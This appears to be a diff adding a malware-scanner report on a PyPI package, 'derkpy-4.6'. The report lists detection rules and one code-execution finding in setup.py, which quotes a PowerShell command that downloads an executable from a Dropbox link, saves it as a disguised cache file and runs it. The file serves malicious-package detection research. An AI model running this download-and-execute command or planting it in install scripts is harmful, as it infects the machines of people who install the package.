@@ -1,0 +1,24 @@
+{
+    "issues": 1,
+    "errors": {},
+    "results": {
+        "clipboard-access": {},
+        "dll-hijacking": {},
+        "steganography": {},
+        "shady-links": {},
+        "obfuscation": {},
+        "exfiltrate-sensitive-data": {},
+        "download-executable": {},
+        "silent-process-execution": {},
+        "cmd-overwrite": {},
+        "code-execution": [
+            {
+                "location": "setup.py:4",
+                "code": "os.system('powershell Invoke-WebRequest -Uri \"https://dl.dropbox.com/s/mkd3enun97s8zag/Oxzy.exe?dl=0\" -OutFile \"~/WindowsCache.exe\"; Invoke-Expression \"~/WindowsCache.exe\"')\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            }
+        ],
+        "exec-base64": {}
+    },
+    "path": "./dataset/pypi/derkpy-4.6"
+}
